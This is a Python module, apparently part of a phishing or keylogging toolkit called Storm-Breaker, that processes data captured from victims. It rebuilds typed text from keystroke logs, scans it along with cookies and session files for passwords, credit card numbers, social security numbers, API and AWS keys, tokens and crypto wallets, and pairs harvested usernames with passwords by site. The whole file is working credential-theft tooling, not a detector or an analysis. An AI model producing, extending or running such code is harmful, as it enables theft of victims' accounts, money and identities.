"""
Storm-Breaker Credential Intelligence Engine
Auto-extracts credentials, PII, and sensitive data from captured keystrokes and form data
"""

import re
import os
import json
from datetime import datetime

BASE_DIR = os.path.dirname(__file__)

# ===== REGEX PATTERNS =====
PATTERNS = {
    'email': {
        'regex': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
        'severity': 'medium',
        'icon': 'fa-envelope',
        'color': 'blue',
    },
    'password': {
        'regex': r'(?:password|passwd|pwd|pass)["\s:=]+([^\s"\'&]{4,64})',
        'severity': 'critical',
        'icon': 'fa-key',
        'color': 'red',
    },
    'credit_card': {
        'regex': r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12}|(?:2131|1800|35\d{3})\d{11})\b',
        'severity': 'critical',
        'icon': 'fa-credit-card',
        'color': 'red',
    },
    'ssn': {
        'regex': r'\b\d{3}-\d{2}-\d{4}\b',
        'severity': 'critical',
        'icon': 'fa-id-card',
        'color': 'red',
    },
    'phone': {
        'regex': r'(?:\+?1[-.\s]?)?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}',
        'severity': 'low',
        'icon': 'fa-phone',
        'color': 'green',
    },
    'crypto_wallet_btc': {
        'regex': r'\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b',
        'severity': 'high',
        'icon': 'fa-coins',
        'color': 'yellow',
    },
    'crypto_wallet_eth': {
        'regex': r'\b0x[a-fA-F0-9]{40}\b',
        'severity': 'high',
        'icon': 'fa-coins',
        'color': 'purple',
    },
    'ip_address': {
        'regex': r'\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b',
        'severity': 'low',
        'icon': 'fa-network-wired',
        'color': 'cyan',
    },
    'url': {
        'regex': r'https?://[^\s<>"\']+',
        'severity': 'low',
        'icon': 'fa-link',
        'color': 'blue',
    },
    'api_key': {
        'regex': r'(?:api[_-]?key|apikey|token|secret|bearer)["\s:=]+([a-zA-Z0-9_\-]{16,128})',
        'severity': 'critical',
        'icon': 'fa-key',
        'color': 'red',
    },
    'aws_key': {
        'regex': r'(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}',
        'severity': 'critical',
        'icon': 'fa-cloud',
        'color': 'orange',
    },
    'private_key': {
        'regex': r'-----BEGIN (?:RSA |DSA |EC )?PRIVATE KEY-----',
        'severity': 'critical',
        'icon': 'fa-lock',
        'color': 'red',
    },
    'jwt_token': {
        'regex': r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
        'severity': 'high',
        'icon': 'fa-ticket-alt',
        'color': 'purple',
    },
}

# In-memory credential store
CREDENTIALS_STORE = []


def scan_keystroke_files():
    """Scan all keystroke files for credentials"""
    ks_dir = os.path.join(BASE_DIR, 'keystrokes')
    if not os.path.exists(ks_dir):
        return []

    found_credentials = []

    for filename in os.listdir(ks_dir):
        if not filename.endswith('.json'):
            continue

        filepath = os.path.join(ks_dir, filename)
        try:
            with open(filepath, 'r') as f:
                data = json.load(f)

            logs = data.get('logs', [])
            url = data.get('url', 'Unknown')

            # Reconstruct typed text from keystroke logs
            typed_text = ''
            password_fields = []
            form_submissions = []

            for log in logs:
                if log.get('type') == 'key':
                    key = log.get('key', '')
                    target = log.get('target', {})

                    if len(key) == 1:
                        typed_text += key

                    # Track password field inputs
                    if target.get('type') == 'password' and len(key) == 1:
                        if not password_fields or password_fields[-1].get('complete'):
                            password_fields.append({'value': key, 'url': url, 'complete': False})
                        else:
                            password_fields[-1]['value'] += key

                    if key in ('Enter', 'Tab') and password_fields and not password_fields[-1].get('complete'):
                        password_fields[-1]['complete'] = True

                elif log.get('type') == 'submit':
                    form_data = log.get('data', {})
                    form_submissions.append({
                        'url': url,
                        'fields': form_data,
                        'timestamp': log.get('timestamp', '')
                    })

            # Extract credentials from typed text
            for pattern_name, pattern_info in PATTERNS.items():
                matches = re.findall(pattern_info['regex'], typed_text, re.IGNORECASE)
                for match in matches:
                    cred = {
                        'type': pattern_name,
                        'value': match if isinstance(match, str) else match[0] if match else '',
                        'source': filename,
                        'url': url,
                        'severity': pattern_info['severity'],
                        'icon': pattern_info['icon'],
                        'color': pattern_info['color'],
                        'timestamp': os.path.getmtime(filepath),
                        'extracted_at': datetime.now().isoformat(),
                    }
                    if cred['value'] and len(cred['value']) > 2:
                        found_credentials.append(cred)

            # Extract from password fields
            for pwd in password_fields:
                if pwd['value'] and len(pwd['value']) >= 3:
                    found_credentials.append({
                        'type': 'password_field',
                        'value': pwd['value'],
                        'source': filename,
                        'url': url,
                        'severity': 'critical',
                        'icon': 'fa-key',
                        'color': 'red',
                        'timestamp': os.path.getmtime(filepath),
                        'extracted_at': datetime.now().isoformat(),
                    })

            # Extract from form submissions
            for form in form_submissions:
                for field_name, field_value in form.get('fields', {}).items():
                    if not field_value or len(str(field_value)) < 3:
                        continue

                    field_lower = field_name.lower()

                    if any(k in field_lower for k in ['pass', 'pwd', 'secret', 'token']):
                        found_credentials.append({
                            'type': 'form_password',
                            'value': str(field_value),
                            'field_name': field_name,
                            'source': filename,
                            'url': form.get('url', ''),
                            'severity': 'critical',
                            'icon': 'fa-key',
                            'color': 'red',
                            'timestamp': os.path.getmtime(filepath),
                            'extracted_at': datetime.now().isoformat(),
                        })
                    elif any(k in field_lower for k in ['user', 'login', 'email', 'name', 'account']):
                        found_credentials.append({
                            'type': 'form_username',
                            'value': str(field_value),
                            'field_name': field_name,
                            'source': filename,
                            'url': form.get('url', ''),
                            'severity': 'high',
                            'icon': 'fa-user',
                            'color': 'blue',
                            'timestamp': os.path.getmtime(filepath),
                            'extracted_at': datetime.now().isoformat(),
                        })

        except Exception as e:
            continue

    # Scan fingerprints for additional data
    found_credentials.extend(scan_fingerprints())

    # Scan session files
    found_credentials.extend(scan_sessions())

    # Deduplicate
    seen = set()
    unique_creds = []
    for cred in found_credentials:
        key = f"{cred['type']}:{cred['value']}:{cred.get('url', '')}"
        if key not in seen:
            seen.add(key)
            unique_creds.append(cred)

    # Update global store
    global CREDENTIALS_STORE
    CREDENTIALS_STORE = unique_creds

    return unique_creds


def scan_fingerprints():
    """Extract data from fingerprint files"""
    fp_dir = os.path.join(BASE_DIR, 'fingerprints')
    if not os.path.exists(fp_dir):
        return []

    creds = []
    for filename in os.listdir(fp_dir):
        if not filename.endswith('.json'):
            continue
        try:
            with open(os.path.join(fp_dir, filename), 'r') as f:
                data = json.load(f)

            # Extract cookies that may contain session tokens
            cookies = data.get('basic', {}).get('cookies', '')
            if cookies:
                for pattern_name in ['jwt_token', 'api_key']:
                    matches = re.findall(PATTERNS[pattern_name]['regex'], cookies)
                    for match in matches:
                        creds.append({
                            'type': f'cookie_{pattern_name}',
                            'value': match if isinstance(match, str) else match[0],
                            'source': filename,
                            'url': data.get('basic', {}).get('url', 'fingerprint'),
                            'severity': 'high',
                            'icon': 'fa-cookie-bite',
                            'color': 'yellow',
                            'timestamp': os.path.getmtime(os.path.join(fp_dir, filename)),
                            'extracted_at': datetime.now().isoformat(),
                        })
        except:
            continue

    return creds


def scan_sessions():
    """Extract data from session recording files"""
    sess_dir = os.path.join(BASE_DIR, 'sessions')
    if not os.path.exists(sess_dir):
        return []

    creds = []
    for filename in os.listdir(sess_dir):
        if not filename.endswith('_meta.json'):
            continue
        try:
            with open(os.path.join(sess_dir, filename), 'r') as f:
                data = json.load(f)

            url = data.get('url', '')
            cookies = data.get('cookies', '')

            if cookies:
                for pattern_name in ['jwt_token']:
                    matches = re.findall(PATTERNS[pattern_name]['regex'], cookies)
                    for match in matches:
                        creds.append({
                            'type': f'session_{pattern_name}',
                            'value': match,
                            'source': filename,
                            'url': url,
                            'severity': 'high',
                            'icon': 'fa-cookie-bite',
                            'color': 'orange',
                            'timestamp': os.path.getmtime(os.path.join(sess_dir, filename)),
                            'extracted_at': datetime.now().isoformat(),
                        })
        except:
            continue

    return creds


def get_credential_stats():
    """Get statistics about extracted credentials"""
    if not CREDENTIALS_STORE:
        scan_keystroke_files()

    stats = {
        'total': len(CREDENTIALS_STORE),
        'critical': sum(1 for c in CREDENTIALS_STORE if c['severity'] == 'critical'),
        'high': sum(1 for c in CREDENTIALS_STORE if c['severity'] == 'high'),
        'medium': sum(1 for c in CREDENTIALS_STORE if c['severity'] == 'medium'),
        'low': sum(1 for c in CREDENTIALS_STORE if c['severity'] == 'low'),
        'by_type': {},
        'unique_urls': len(set(c.get('url', '') for c in CREDENTIALS_STORE)),
    }

    for cred in CREDENTIALS_STORE:
        t = cred['type']
        stats['by_type'][t] = stats['by_type'].get(t, 0) + 1

    return stats


def pair_credentials():
    """Try to pair usernames with passwords from the same source/URL"""
    pairs = []
    usernames = [c for c in CREDENTIALS_STORE if c['type'] in ('form_username', 'email')]
    passwords = [c for c in CREDENTIALS_STORE if c['type'] in ('form_password', 'password_field', 'password')]

    for u in usernames:
        for p in passwords:
            # Same source file or same URL = likely a pair
            if u.get('source') == p.get('source') or (u.get('url') and u.get('url') == p.get('url')):
                pairs.append({
                    'username': u['value'],
                    'password': p['value'],
                    'url': u.get('url', p.get('url', '')),
                    'source': u.get('source', p.get('source', '')),
                    'severity': 'critical',
                    'timestamp': max(u.get('timestamp', 0), p.get('timestamp', 0)),
                })

    # Deduplicate pairs
    seen = set()
    unique = []
    for pair in pairs:
        key = f"{pair['username']}:{pair['password']}:{pair['url']}"
        if key not in seen:
            seen.add(key)
            unique.append(pair)

    return unique
